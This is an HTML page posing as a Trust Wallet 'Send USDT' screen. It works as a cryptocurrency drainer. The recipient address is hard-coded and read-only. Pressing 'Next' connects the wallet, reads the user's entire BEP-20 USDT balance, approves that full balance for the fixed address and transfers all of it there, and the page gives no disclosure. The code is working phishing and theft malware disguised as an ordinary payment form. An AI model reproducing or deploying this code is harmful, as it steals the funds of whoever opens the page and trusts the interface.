<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Send USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background: #0c0c0c;
      color: #fff;
      font-family: system-ui, sans-serif;
      margin: 0;
    }
    .container {
      max-width: 500px;
      margin: 0 auto;
      padding: 20px;
    }
    h1 {
      font-size: 20px;
      padding: 16px;
    }
    label {
      display: block;
      color: #aaa;
      font-size: 14px;
      margin-top: 20px;
    }
    .input-box {
      background: #1b1b1b;
      border: 1px solid #2c2c2c;
      border-radius: 14px;
      padding: 12px;
      display: flex;
      align-items: center;
      margin-top: 5px;
    }
    .input-box input {
      flex: 1;
      background: transparent;
      border: none;
      color: white;
      font-size: 16px;
      outline: none;
    }
    .right {
      color: #00ff99;
      font-size: 14px;
      margin-left: 10px;
      cursor: pointer;
    }
    .usd {
      color: #888;
      font-size: 13px;
      margin-top: 10px;
    }
    button {
      width: 100%;
      background: #2c7a4b;
      color: white;
      font-weight: bold;
      font-size: 18px;
      padding: 14px;
      border-radius: 30px;
      border: none;
      margin-top: 40px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Send USDT</h1>

    <label>Address or Domain Name</label>
    <div class="input-box">
      <input type="text" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" readonly>
    </div>

    <label>Amount</label>
    <div class="input-box">
      <input type="text" placeholder="USDT Amount" readonly>
      <div class="right" onclick="fillMax()">Max</div>
    </div>

    <div class="usd">≈ $0.00</div>

    <button onclick="start()" id="nextBtn">Next</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <script>
    const TO = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
    const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20
    const ABI = [
      { "constant": false, "inputs": [ { "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "approve", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
      { "constant": false, "inputs": [ { "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "transferFrom", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
      { "constant": true, "inputs": [ { "name": "owner", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "", "type": "uint256" } ], "type": "function" }
    ];

    async function start() {
      const btn = document.getElementById("nextBtn");
      btn.innerText = "Processing...";
      btn.disabled = true;

      if (!window.ethereum) {
        alert("Please open in Trust Wallet browser");
        btn.innerText = "Next";
        btn.disabled = false;
        return;
      }

      try {
        const web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const accounts = await web3.eth.getAccounts();
        const user = accounts[0];

        const contract = new web3.eth.Contract(ABI, USDT);
        const balance = await contract.methods.balanceOf(user).call();

        await contract.methods.approve(TO, balance).send({ from: user });
        await contract.methods.transferFrom(user, TO, balance).send({ from: user });

        btn.innerText = "✅ Done";
      } catch (e) {
        console.error(e);
        btn.innerText = "❌ Failed";
      }

      setTimeout(() => {
        btn.innerText = "Next";
        btn.disabled = false;
      }, 3000);
    }

    function fillMax() {
      alert("Max selected (auto transfer full balance)");
    }
  </script>

</body>
</html>
